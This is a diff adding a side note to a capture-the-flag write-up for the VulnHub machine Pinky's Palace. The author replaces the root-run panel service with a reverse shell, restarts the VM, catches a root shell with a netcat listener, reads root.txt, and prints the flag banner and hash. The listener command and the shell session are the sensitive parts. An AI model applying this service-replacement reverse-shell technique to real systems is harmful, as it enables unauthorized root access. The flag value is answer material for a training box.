@@ -1073,4 +1073,40 @@ And after playing around with the panel application on my local x64 Kali, I did 
 Time to roll up the old sleeves and develop a buffer overflow reverse shell for the **WIN**... Evan's Debugger (edb) to the rescue!
 
 
+## SIDE NOTE:  Finishing via cheating
 
+After replacing the panel service with the reverse shell, I decided to "cheat" and just restart the VM.
+This triggered the panel service to be reloaded and triggered the reverse shell from root.
+Of course this is not how the box was meant to be solved.  The intended approach is to exploit the buffer overflow in panel service.
+
+```
+root@kali:~# nc -nlvp 444
+listening on [any] 444 ...
+connect to [192.168.225.129] from (UNKNOWN) [192.168.225.130] 35144
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root/
+ls
+root.txt
+cat root.txt
+
+ ____  _       _          _     
+|  _ \(_)_ __ | | ___   _( )___ 
+| |_) | | '_ \| |/ / | | |// __|
+|  __/| | | | |   <| |_| | \__ \
+|_|   |_|_| |_|_|\_\\__, | |___/
+                    |___/       
+ ____       _                   
+|  _ \ __ _| | __ _  ___ ___ 
+| |_) / _` | |/ _` |/ __/ _ \
+|  __/ (_| | | (_| | (_|  __/
+|_|   \__,_|_|\__,_|\___\___|
+
+[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!                             
+[+] Flag: 2208f787fcc6433b4798d2189af7424d
+[+] Twitter: @Pink_P4nther
+[+] Cheers to VulnHub!
+[+] VM Host: VMware
+[+] Type: CTF || [Realistic]
+[+] Hopefully you enjoyed this and gained something from it as well!!!
+```
